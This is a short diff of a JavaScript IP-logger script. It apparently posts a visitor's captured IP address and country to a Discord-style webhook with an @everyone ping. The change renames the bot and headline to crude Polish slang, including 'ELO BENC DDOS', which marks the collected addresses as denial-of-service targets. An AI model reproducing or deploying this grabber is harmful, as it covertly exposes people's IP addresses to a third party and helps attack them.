@@ -20,9 +20,9 @@ const request = async () => { // Calling a "synchronous" fetch
     postRequest.setRequestHeader('Content-type', 'application/json');
 
     var params = {
-        username:   "IP Log",
+        username:   "kutas 2000",
         avatar_url: "",
-        content:    "**NOWA KURWA IP BOMBA** @everyone \n" + 
+        content:    "**ELO BENC DDOS** @everyone \n" + 
 		    "__**:globe_with_meridians: IP Address:**__ \n" +
                     "`" + ip + "` \n \n" +
 		    "__**Country:**__ \n" +
